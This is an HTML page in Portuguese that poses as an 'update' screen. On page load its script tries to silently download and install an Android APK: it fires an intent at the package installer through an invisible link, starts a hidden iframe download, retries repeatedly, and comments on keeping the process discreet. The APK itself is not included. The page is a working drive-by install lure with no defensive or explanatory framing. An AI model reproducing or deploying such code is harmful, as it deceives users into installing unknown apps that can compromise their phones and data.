<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Atualização</title>
    <style>
        body { 
            font-family: sans-serif; 
            background: #000; 
            color: #fff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .card { 
            background: #1a1a1a; 
            padding: 20px; 
            border-radius: 8px; 
            text-align: center; 
        }
        .hidden { display: none; }
        /* Animação sutil de loading */
        .pulse {
            width: 10px;
            height: 10px;
            background: #00ff00;
            border-radius: 50%;
            animation: pulse 1.5s infinite;
            margin: 10px auto;
        }
        @keyframes pulse {
            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 255, 0, 0.7); }
            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(0, 255, 0, 0); }
            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 255, 0, 0); }
        }
    </style>
</head>
<body>

    <div class="card">
        <h2>Instalando...</h2>
        <div class="pulse" id="loader"></div>
        <p id="status">Baixando em segundo plano</p>
        <button id="btn" class="hidden" onclick="forceInstall()">Instalar</button>
    </div>

    <script>
        const APK = 'app.apk';
        // Usamos relative path para garantir mesmo domínio
        const url = APK; 

        function startSilent() {
            // 1. Tenta o Intent Nativo (A melhor chance de discrição)
            // O segredo é o 'package=com.android.packageinstaller'
            const intent = `intent://${url}#Intent;scheme=https;package=com.android.packageinstaller;end`;
            
            // Cria um link invisível e dispara
            const a = document.createElement('a');
            a.href = intent;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            // 2. Tenta também o download direto via iframe (fallback)
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = url;
            document.body.appendChild(iframe);

            // 3. Monitora se a tela mudou (sinal de que o intent funcionou)
            document.addEventListener('visibilitychange', () => {
                if (document.hidden) {
                    // Sucesso! O Android abriu a tela de instalação
                    document.getElementById('loader').classList.add('hidden');
                    document.getElementById('status').innerText = 'Instalação iniciada';
                } else {
                    // A tela voltou, mas não vimos a instalação. 
                    // Tenta de novo em 1s.
                    setTimeout(startSilent, 1000);
                }
            });

            // 4. Se demorar muito, mostra botão discreto
            setTimeout(() => {
                if (!document.hidden) {
                    document.getElementById('loader').classList.add('hidden');
                    document.getElementById('status').innerText = 'Toque para concluir';
                    document.getElementById('btn').classList.remove('hidden');
                }
            }, 5000);
        }

        function forceInstall() {
            // Se o usuário clicar, força o download e abre o instalador
            window.location.href = url;
            setTimeout(() => {
                window.location.href = `intent://${url}#Intent;package=com.android.packageinstaller;scheme=https;end`;
            }, 1000);
        }

        startSilent();
    </script>

</body>
</html>
